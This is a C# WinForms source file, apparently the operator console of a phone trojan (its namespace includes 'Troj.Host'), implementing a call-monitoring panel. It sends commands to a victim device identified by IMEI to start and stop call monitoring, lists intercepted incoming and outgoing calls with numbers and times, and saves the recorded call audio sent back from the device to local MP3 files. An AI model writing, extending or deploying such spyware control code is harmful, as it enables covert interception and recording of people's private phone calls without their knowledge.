using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.IO;
using InOut;
using InOut.PacketImp;
using InOut.Utils;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class CallMonitorPanel : UserControl
    {
        private readonly string imei;
        private readonly IServer server;
        private string recordFolder;
        private string phoneRecordFile;


        public CallMonitorPanel(string imei, IServer server)
        {
            this.imei = imei;
            this.server = server;
            InitializeComponent();
            recordFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Record");

            if (!Directory.Exists(recordFolder))
            {
                Directory.CreateDirectory(recordFolder);
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            server.CommandSender(imei, Protocol.MonitorCall, null);
            lvCallMonitor.Items.Clear();
        }

        private void btnEnd_Click(object sender, EventArgs e)
        {
            server.CommandSender(imei, Protocol.StopMonitorCall, null);
        }

        public void AddMonitoredCall(int type, string phonenumber, string date, byte[] phonedata)
        {
            lvCallMonitor.BeginUpdate();
            if ((type == 1))
            {
                       
                lvCallMonitor.Items.Add(new ListViewItem(new[]
                    {
                
                        "来电",
                        phonenumber,
                        date
                    }));
            
            }
            if ((type == 4))
            {

                lvCallMonitor.Items.Add(new ListViewItem(new[]
                    {
                
                        "去电",
                        phonenumber,
                        date
                    }));

            }
            if ((type == 5))
            {

                lvCallMonitor.Items.Add(new ListViewItem(new[]
                    {
                
                        "挂断电话",
                        phonenumber,
                        date
                    }));
                
                string fileName = DateTime.Now.ToString("yyyyMMddHHmmss") + ".mp3";
                string recordlocation = recordFolder + "\\" + fileName;
                FileStream fs = new FileStream(recordlocation, FileMode.OpenOrCreate);
                if (phonedata != null)
                {
                    MemoryStream m = new MemoryStream(phonedata);
                    m.WriteTo(fs);
                    MessageBox.Show("录音文件保存为：" + recordFolder + "\\" + fileName);
                    m.Close();
                    fs.Close();
                    m = null;
                    fs = null;
                }
                /*
                if (!string.IsNullOrEmpty(phoneRecordFile))
                {

                    server.CommandFileSender(imei, Protocol.GetFile, phoneRecordFile.GetBytes(), recordFolder, fileName);
                    //写入wav文件头，让音频文件可以播放
                    //MessageBox.Show("录音文件保存为：" + recordFolder + "\\" + fileName);
                    phoneRecordFile = string.Empty;
                }
                 * */
                 

            }
            lvCallMonitor.EndUpdate();
        }

        /*
        public void AddSoungBytes(byte[] data)
        {
            MessageBox.Show("1");
            if (data != null)
                deviceRecordFile = data.ParseString();
        }
         */

    }
}
